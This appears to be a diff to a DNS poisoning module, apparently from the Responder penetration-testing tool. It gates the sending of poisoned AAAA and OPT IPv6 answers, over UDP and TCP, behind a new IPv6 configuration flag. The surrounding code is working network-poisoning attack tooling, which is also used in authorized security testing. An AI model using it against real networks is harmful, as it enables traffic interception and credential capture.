@@ -21,6 +21,9 @@ if settings.Config.PY2OR3 == "PY3":
 else:
 	from SocketServer import BaseRequestHandler
 
+#Should we answer to those AAAA?
+Have_IPv6 = settings.Config.IPv6
+
 def ParseDNSType(data):
 	QueryTypeClass = data[len(data)-4:]
 	OPT = data[len(data)-22:len(data)-20]
@@ -65,14 +68,14 @@ class DNS(BaseRequestHandler):
 				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
 				print(color("[*] [DNS] SRV Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))
 
-			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "IPv6":
+			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "IPv6" and Have_IPv6:
 				buff = DNS6_Ans()
 				buff.calculate(NetworkRecvBufferPython2or3(data))
 				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
 				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
 				print(color("[*] [DNS] AAAA Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))
 
-			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv6":
+			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv6" and Have_IPv6:
 				buff = DNS6_Ans()
 				buff.calculate(NetworkRecvBufferPython2or3(data))
 				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
@@ -113,14 +116,14 @@ class DNSTCP(BaseRequestHandler):
 				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
 				print(color("[*] [DNS] SRV Record poisoned answer sent: %-15s  Requested name: %s" % (self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))
 
-			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "IPv6":
+			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "IPv6" and Have_IPv6:
 				buff = DNS6_Ans()
 				buff.calculate(NetworkRecvBufferPython2or3(data))
 				self.request.send(NetworkSendBufferPython2or3(buff))
 				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
 				print(color("[*] [DNS] AAAA Record poisoned answer sent: %-15s  Requested name: %s" % (self.client_address[0].replace("::ffff:",""), ResolveName), 2, 1))
 
-			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv6":
+			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv6" and Have_IPv6:
 				buff = DNS6_AnsOPT()
 				buff.calculate(NetworkRecvBufferPython2or3(data))
 				self.request.send(NetworkSendBufferPython2or3(buff))
